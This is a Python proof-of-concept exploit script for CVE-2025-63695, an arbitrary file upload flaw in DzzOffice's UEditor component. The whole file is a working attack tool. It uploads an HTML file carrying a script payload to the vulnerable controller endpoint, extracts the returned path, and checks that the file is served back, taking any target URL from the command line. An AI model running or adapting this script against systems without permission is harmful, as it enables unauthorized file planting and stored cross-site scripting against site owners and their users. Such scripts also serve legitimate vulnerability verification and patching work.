#!/usr/bin/env python3
import requests
import sys
import re
import random
import string

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def exploit(target_url):
    poc_content = f"""<html>
<head><title>CVE-2025-63695 PoC</title></head>
<body>
<h1>CVE-2025-63695 - Arbitrary File Upload</h1>
<script>alert('XSS via Arbitrary File Upload - ' + document.domain);</script>
<p>Token: {generate_random_string(16)}</p>
</body>
</html>"""

    upload_url = f"{target_url.rstrip('/')}/dzz/system/ueditor/php/controller.php?action=uploadfile"
    
    filename = f"poc_{generate_random_string()}.html"
    files = {
        'upfile': (filename, poc_content, 'text/html')
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Upload URL: {upload_url}")
    print(f"[*] Filename: {filename}")
    
    try:
        response = requests.post(upload_url, files=files, timeout=30)
        print(f"[*] Response Status: {response.status_code}")
        print(f"[*] Response Body: {response.text}")
        
        if response.status_code == 200:
            match = re.search(r'"url"\s*:\s*"([^"]+)"', response.text)
            if match:
                uploaded_path = match.group(1).replace('\\/', '/')
                poc_url = f"{target_url.rstrip('/')}{uploaded_path}"
                print(f"\n[+] SUCCESS! File uploaded successfully!")
                print(f"[+] PoC URL: {poc_url}")
                
                verify_resp = requests.get(poc_url, timeout=10)
                if "CVE-2025-63695" in verify_resp.text:
                    print(f"[+] VERIFIED! Uploaded file is accessible and executable!")
                    return True, poc_url
                else:
                    print(f"[-] Warning: File uploaded but verification failed")
                    return True, poc_url
            else:
                state_match = re.search(r'"state"\s*:\s*"([^"]+)"', response.text)
                if state_match:
                    print(f"[-] Upload failed: {state_match.group(1)}")
                else:
                    print(f"[-] Upload failed: Unknown error")
                return False, None
        else:
            print(f"[-] HTTP Error: {response.status_code}")
            return False, None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Error: {e}")
        return False, None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8787")
        sys.exit(1)
    
    target_url = sys.argv[1]
    success, poc_url = exploit(target_url)
    
    if success:
        print("\n" + "="*60)
        print("[+] Vulnerability CVE-2025-63695 confirmed!")
        print("[+] DzzOffice Arbitrary File Upload via UEditor")
        print("="*60)
        sys.exit(0)
    else:
        print("\n[-] Exploitation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
